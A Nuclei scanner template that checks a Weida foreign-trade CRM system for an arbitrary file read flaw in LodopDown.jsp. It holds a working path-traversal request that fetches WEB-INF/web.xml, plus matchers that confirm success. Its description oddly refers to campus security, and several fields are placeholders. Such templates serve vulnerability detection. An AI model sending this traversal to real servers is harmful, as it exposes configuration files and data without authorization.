id: weidasoft-crm-lodopdown-fileread
info:
  name: 维达外贸客户关系管理系统LodopDown存在任意文件读取漏洞
  author: leadlife
  severity: high
  description: 维达外贸客户关系管理系统 LodopDown存在任意文件读取漏洞，攻击者可以通过精心构造的请求参数，绕过权限验证，直接读取服务器上的敏感文件内容。该漏洞可能导致系统配置文件、用户数据或其他关键信息的泄露，进而为攻击者提供进一步入侵系统的可能性，严重威胁校园信息安全。
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fileread,weidasoft

http:
  - raw:
      - |
        GET /file/LodopDown.jsp?sFile=../../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml version')
        condition: and